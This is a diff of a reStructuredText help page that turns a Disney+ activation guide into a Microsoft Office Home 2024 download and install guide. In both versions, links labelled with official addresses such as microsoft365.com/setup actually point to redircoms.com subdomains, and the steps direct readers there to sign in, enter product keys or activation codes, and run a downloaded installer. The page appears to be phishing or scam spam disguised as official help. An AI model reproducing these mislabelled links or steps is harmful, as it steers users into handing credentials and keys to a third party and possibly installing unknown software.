@@ -1,5 +1,5 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+Microsoft Office Home 2024: Download and Installation Instructions
 ##################
 
 .. meta::
@@ -14,35 +14,41 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: microsoft365.com/setup
+   :target: https://ms.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+Just purchased Microsoft Office Home 2024? Get started by downloading and installing it on your PC or Mac. Use `microsoft365.com/setup <https://ms.redircoms.com>`_ to activate your product and begin the installation process.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Download and Install Office Home 2024
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Open a browser and visit `microsoft365.com/setup <https://ms.redircoms.com>`_.
+2. Sign in using your **Microsoft account** or create a new one.
+3. Enter your **25-character Office product key** when prompted.
+4. Select your **Office Home 2024** product and click **Next**.
+5. Choose your operating system (Windows or Mac) and click **Download**.
+6. Once downloaded, run the installer and follow the on-screen instructions to complete setup.
 
 **********
-What to Do After Activation
+System Requirements
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+- Windows 10 or later / macOS Monterey or later
+- At least 4 GB RAM and 10 GB free disk space
+- Stable internet connection for download and activation
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+**********
+Activation Tips
+**********
+
+- Ensure your system meets the minimum requirements.
+- Product key can only be used once per license—store it safely.
+- Link your Office license to your Microsoft account for future reinstallation.
+
+Get the most out of your Office Home 2024 suite by activating and installing it from `microsoft365.com/setup <https://ms.redircoms.com>`_ today.
